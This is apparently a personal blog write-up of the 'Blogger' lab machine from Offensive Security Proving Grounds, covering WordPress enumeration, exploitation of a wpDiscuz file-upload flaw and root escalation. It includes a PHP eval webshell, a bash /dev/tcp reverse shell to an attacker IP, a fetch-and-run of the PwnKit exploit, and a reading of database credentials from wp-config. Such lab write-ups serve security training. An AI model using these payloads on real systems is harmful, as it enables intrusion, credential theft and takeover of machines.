In this blogpost , I will document how I was able to gain access to the Blogger Machine from Offensive Security Proving Ground Labs. The Blogger Box was a beginner level easy box.

Machine is running on `192.168.241.217`. First things first, we add the entry to `/etc/hosts`

* Only ssh and http services are running on the machine


`nmap` <br/>
* From here we can conduct a more detailed nmap scan
```

* Visiting the http website we find a developer's portfolio. Checking the source code does not get us anything useful. We can now conduct a directory bruteforce

`fuff` <br/>
* Performing a directory bruteforce using ffuf gives us the following output

```

* The assets directory could contain interesting files and folders, navigating to it shows a `fonts` folder which contains a folder called `blog`.
	![images](/images/Blogger/1.jpg)
* Viewing the blog page , we get the following content
	![images](/images/Blogger/2.jpg)
* Checking the network tab, I realized that the blog is sending requests to `blogger.thm`, we can add that to our `/etc/hosts` file



### Enumeration
`versions` <br/>
* I suspected the blog could be a wordpress blog. I then used a tool I created to confirm.
```
$ findwordpressversions http://blogger/assets/fonts/blog/ url
http://blogger/assets/fonts/blog/        = >  [+] WordPress 4.9.8
```
* We get the version of wordpress to be `WordPress 4.9.8`

`users` <br/>
* Now that we can confirm that the blog is a wordpress blog, we can now enumerate users,plugins,themes and their potential vulnerabilities
* We can find wordpress users by accessing *http://blogger/assets/fonts/blog/index.php/?rest_route=/wp/v2/users* which gives us user information in json form. We only find one user (`j@m3s`) with the following information
	```
	[
	  {
	    "id": 1,
	    "name": "j@m3s",
	    "url": "",
	    "description": "",
	    "link": "http://blogger.thm/assets/fonts/blog/?author=1",
	    "slug": "jm3s",
	    "avatar_urls": {
	      "24": "http://2.gravatar.com/avatar/e50b9f1e8b350e9972873b36601a8212?s=24&d=mm&r=g",
	      "48": "http://2.gravatar.com/avatar/e50b9f1e8b350e9972873b36601a8212?s=48&d=mm&r=g",
	      "96": "http://2.gravatar.com/avatar/e50b9f1e8b350e9972873b36601a8212?s=96&d=mm&r=g"
	    },
	    "meta": [],
	    "_links": {
	      "self": [
	        {
	          "href": "http://blogger.thm/assets/fonts/blog/index.php?rest_route=/wp/v2/users/1"
	        }
	      ],
	      "collection": [
	        {
	          "href": "http://blogger.thm/assets/fonts/blog/index.php?rest_route=/wp/v2/users"
	        }
	      ]
	    }
	  }
	]
	```

`plugins` <br/>
* We can enumerate plugins on the blog using the command 
```
wpscan --api-token <wpscantokenhere> --url http://blogger/assets/fonts/blog enumerate ap --plugins-detection aggressive
```
* From the scan we obtain a plugin: `wpdiscuz` which is vulnerable to a file upload vulnerability according to searchsploit
* We can also find this plugin by viewing the source of the link *http://blogger.thm/assets/fonts/blog/?p=27* and searching the word *plugin*. We find the link *http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/assets/css/wpdiscuz-combo.min.css?ver=4.9.8* revealing the *wpdiscuz* plugin.
* We can now use searchsploit to find out if the plugin has any vulnerabilities.
```
$ searchsploit wpdiscuz
------------------------------------------------------------ ---------------------------------
 Exploit Title                                              |  Path

Wordpress Plugin wpDiscuz 7.0.4 - Unauthenticated Arbitrary | php/webapps/49401.rb
------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```



### Exploitation
`Exploiting wpdiscuz plugin` <br/>
* wpDiscuz is a comment plugin for WordPress. This is a responsive comment system which offers a real-time discussion function for  visitors to post, share, and vote on comments and also allowing them to upload files. 
* From the searchsploit results above, we found out that the plugin is vulnerable to a *Arbitrary File Upload* vulnerability.
* We can abuse this upload functionality to upload a php shell to the website that allows us to run custom commands. But first, we need to comment on a post and attach a file to upload as follows.
* We then need to create a php shell to upload. We can create a file with the following content and name it `shell.php` 
```
GIF8;
<?php if(isset($_POST['cmd'])){print_r(@eval($_POST['cmd']));} ?>
```
* Now we can create a post and upload our file
	![images](/images/Blogger/6.jpg)
* Once our post is ready and we have attached and uploaded our php shell, we get a link to access the newly uploaded file(php shell) 
	![images](/images/Blogger/7.jpg)

### Initial Foothold
`Gaining access to the box` <br/>
* The shell is uploaded to the location *http://blogger.thm/assets/fonts/blog/wp-content/uploads/2022/11/shell-1667918567.7365.php*
* I then used a tool I created [webshell](https://github.com/allannjuguna/scripts/blob/main/webshell.py) to access the php webshell
	![images](/images/Blogger/8.jpg)
* Reading the `wp-config.php` file we find the following credentials
	![images](/images/Blogger/9.jpg)
* Below is a snippet of the information in the file
	```
	define('DB_NAME', 'wordpress');
	/** MySQL database username */
	define('DB_USER', 'root');
	/** MySQL database password */
	define('DB_PASSWORD', 'sup3r_s3cr3t');
	/** MySQL hostname */
	define('DB_HOST', 'localhost');
	```

* We can then establish a reverse netcat connection from the victim machine using */bin/bash -c 'bash -i >& /dev/tcp/192.168.49.241/8080 0>&1'* where 192.168.49.241 is the attacker machine, then listen for the connection on the attacker machine using `nc -vvlp 8080` 
![images](/images/Blogger/10.jpg)
* Checking the `/tmp` folder , we find the following content
```
www-data@ubuntu-xenial:~$ ls /tmp
backup.tar.gz
vmware-root
```
* The `backup.tar.gz` file looks interesting, extracting the file, we get the local flag.
```
www-data@ubuntu-xenial:~$ tar -xvf backup.tar.gz
local.txt
ㅤ
www-data@ubuntu-xenial:~$ ls
backup.tar.gz
local.txt
vmware-root
ㅤ
www-data@ubuntu-xenial:~$ cat local.txt
e0ce00f4126d0271c1f4eb3681cda8f0
ㅤ
www-data@ubuntu-xenial:~$
```
* Find files in the `home` directory 
```
$ find /home -type f 2>/dev/null
/home/james/local.txt
/home/james/.bashrc
/home/james/.bash_logout
/home/james/.profile
/home/vagrant/.bashrc
/home/vagrant/.mysql_history
/home/vagrant/.bash_logout
/home/vagrant/.profile
/home/vagrant/.bash_history
/home/ubuntu/.bashrc
/home/ubuntu/.bash_logout
/home/ubuntu/.profile
$ 
```
* Reading the first flag
```
$ cat /home/james/local.txt
e0ce00f4126d0271c1f4eb3681cda8f0
$ 
```


### Escalation
`Find suid binaries`  <br/>
* We can find suid binaries we can exploit to gain root
```
$ find / -type f -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newuidmap
/usr/bin/at
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/newgrp
/bin/mount
/bin/ping6
/bin/su
/bin/ping
/bin/umount
/bin/fusermount
```
* From the binaries above, I suspected that the `pkexec` service is vulnerable to `CVE-2021-4034`.
* First we download the pkexec exploit on our attacker machine using *curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit* then we can serve the file to the victim machine using `python3 -m http.server 9090`
* We can then download the file to the victim machine using *wget http://192.168.49.241:9090/PwnKit -O /tmp/exploit*
* Once the file is downloaded onto the victim machine, we can now make it executable and run it as follows

```
$ chmod +x exploit
$ ./exploit
ㅤ
$ root@ubuntu-xenial:/tmp# cd /rootㅤ
$ root@ubuntu-xenial:~# ls
ls
proof.txt
ㅤ	ㅤ
$ root@ubuntu-xenial:~# cat proof.txt
d65d877fe77de03f74c3950b76b7683e
ㅤ
$ root@ubuntu-xenial:~#
```




### Lessons Learnt
`vagrant user`
* The password for the `vagrant` user was `vagrant`. We could have switched to this user and gained `root` access since they had the rights to run any command as `sudo` as demonstrated below
	```
	$ whoami
	www-data
	ㅤ
	$ su vagrant
	Password: vagrant
	ㅤ
	vagrant@ubuntu-xenial:/tmp$ sudo -l
	ㅤ
	Matching Defaults entries for vagrant on ubuntu-xenial:
	    env_reset, mail_badpass,
	    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	User vagrant may run the following commands on ubuntu-xenial:
	    (ALL) NOPASSWD: ALL
	    ㅤ
	vagrant@ubuntu-xenial:/tmp$ sudo su
	root@ubuntu-xenial:/tmp# 
	```

### Rabbit Holes
`wordpress`
* Since the wordpress enumeration gave us the user `j@m3s` as the only single user, I thought that we can bruteforce the password to gain access to the wordpress admin panel, but that definitely didn't work

`root user`
* Since the password for the `root` user in the wp-config file is `sup3r_s3cr3t`. I thought that this password could be the password for one of the users in the machine
